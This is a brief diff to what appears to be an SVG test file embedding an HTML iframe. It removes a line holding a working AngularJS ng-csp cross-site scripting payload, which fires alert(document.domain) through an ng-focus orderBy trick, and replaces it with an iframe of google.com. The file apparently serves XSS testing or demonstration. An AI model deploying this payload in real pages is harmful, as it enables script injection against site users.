@@ -727,7 +727,7 @@
         <foreignObject width="1000" height="1000"
                        requiredExtensions="http://www.w3.org/1999/xhtml">
             <body xmlns="http://www.w3.org/1999/xhtml">
-                <iframe  width="100%" height="1000" srcdoc="&lt;script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js'&gt;&lt;/script&gt;&lt;html ng-app ng-csp&gt;CLICK on this input area -&gt; &lt;input id=x ng-focus=$event.path|orderBy:'x&amp;&amp;[document.domain].map(alert)'&gt;"></iframe>
+                <iframe  width="100%" height="1000" src="https://google.com"></iframe>
             </body>
         </foreignObject>
     </svg>
